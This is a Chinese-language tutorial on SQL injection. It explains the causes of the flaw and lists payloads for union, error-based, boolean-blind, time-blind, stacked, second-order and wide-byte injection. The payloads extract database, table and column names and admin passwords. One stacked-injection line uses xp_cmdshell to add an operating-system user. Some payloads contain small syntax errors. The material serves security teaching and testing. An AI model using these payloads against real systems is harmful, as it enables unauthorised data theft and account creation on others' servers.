SQL注入原理:

指web应用程序对用户输入数据的合法性没有判断,前端传入后端的参数是攻击者可控的,并且参数带入数据库查询,攻击者可以通过构造不同的sql语句实现对数据库是任意操作.

SQL注入的条件:

1.参数可控,前端传给后端的参数内容是用户可以控制的2.参数带入数据库查询:传入的参数拼接到sql语句,且带入数据库查询

SQL注入分类

变量类型

1.数字型 

select * from admin where id=1

2.字符型 

select * from admin where id='1'

3.搜索型

select * from admin where id='%1%'

4.json型 

{"name":"ytc and 1=1"} 直接输入ytc and 1=1  不用闭合"}

HTTP提交方式

1.GET型2.POST型3.COOKIE型4.X-Forwarded-For型5.Referer型

注入方式

1.联合注入2.报错注入3.布尔盲注4.时间盲注5.堆叠注入

  • 数字型的联合注入

获取数据库名字:id=-1 union select 1,schema_name,3 from information_schema.schemata where schema_name=database()#获取表名:id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#获取列名:id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="admin"#获取字段:id=-1 union id,username,password from admin limit 0,1#

  • 数字型的报错注入:updatexml,extractvalue

获取数据库名:id=1 and updatexml(1,concat(0x7e,select database()),1)#获取表名:id=1 and updatexml(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema=database()),1)#获取列名:id=1 and updatexml(1,concat(0x7e,select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="sql"),1)#报错位显示不全的可以使用substrid=1 and updatexml(1,concat(0x7e,substr((select password from admin limit 0,1),1,30)),1)

  • 数字型的布尔盲注

判断是否有布尔盲注:id=1 and length(database())>=1--+id=if(length(database())>1,1,0)--+id=1^ascii(substr(database(),1,1))=115--+id=1 and ord(substr(database(),1,1))=115--+id=1 and substr(database(),1,1)="s"--+获取数据库名字:id=1 and ascii(substr(database(),1,1))=115--+获取表名:id=1 and substr((select table_name from information_schema.tables where table_schema="sql" limit 0,1),1,1)="e"--+获取列名:id=1 and substr((select column_name from information_schema.columns where table_schema="sql" and table_name="admin" limit 0,1),1,1)="a"--

  • 数字型的时间盲注

获取数据库名:id=1 and if(length(database())>1,sleep(5),0)--+获取数据库表名:id=1 and if(substr((select table_name from information_schema.tables where table_schema="sql" limit 0,1),1,1)="a",sleep(5),1)获取数据库列名:id=1 and if(substr((select column_name from information_schema.columns where table_schema="sql" and table_name="admin" limit 0,1),1,1)="a",sleep(5),1)

  • 数字型的堆叠注入(sqlserver支持多语句执行)

id=1;select if(substr(user(),1,1)="r",sleep(3),1)#id=1;exec xp_cmdshell 'net user test 123 /add'# (sqlserver)

字符型与搜索型注入的利用方法同上,只是闭合方式不同

二次注入

我们注册账号的时候,程序获取到get型的参数username和password,然后将username和password拼接到sql语句中,使用insert插入到数据库中,由于参数username使用addslashes进行转义(转义了单引号,导致单引号无法闭合),参数password进行了md5哈希,所以此处不存在sql注入漏洞,但是在读取用户名的时候,没有对从数据库中取出的username参数进行转义,在第一步中我们注册的用户名是test',此时执行的sql语句为select * from person where username='test'',此单引号被带入sql语句中,由于多了一个单引号,所以页面就会报错

宽字节注入

当服务器开启GPC时,会转义我们输入的单引号等,当传入id=1'时,传入的单引号被转义变成id=1\',导致参数id无法逃逸单引号的包围,所以一般情况下是不存在sql注入漏洞的,但当数据库编码是GBK时,%df%5c会被当成一个字符,\的编码为%5c,所以当我们传入id=1%df'时,服务端经过转义救会变成id=1%df%5c',会导致转义符号失效,从而使用户的单引号生效产生sql注入.
